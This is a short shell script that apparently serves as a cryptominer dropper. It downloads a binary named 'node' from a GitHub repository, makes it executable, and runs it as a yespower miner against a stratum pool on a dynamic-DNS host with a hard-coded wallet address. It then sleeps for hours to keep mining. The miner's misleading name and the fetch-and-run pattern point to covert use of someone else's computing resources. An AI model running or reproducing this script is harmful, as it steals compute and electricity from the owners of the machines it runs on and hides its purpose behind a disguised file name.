#!/bin/sh
set -e
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
HOURESX=crf_$(date +%S)
./node -a yespower -o stratum+tcp://mining-pool.zapto.org:3710 -u WXeJSqsKYiHLTzwLBSM93z1spxCpyeAcqP.${WORKER_NUMBER}_${HOURESX} > try.log
sleep 29999

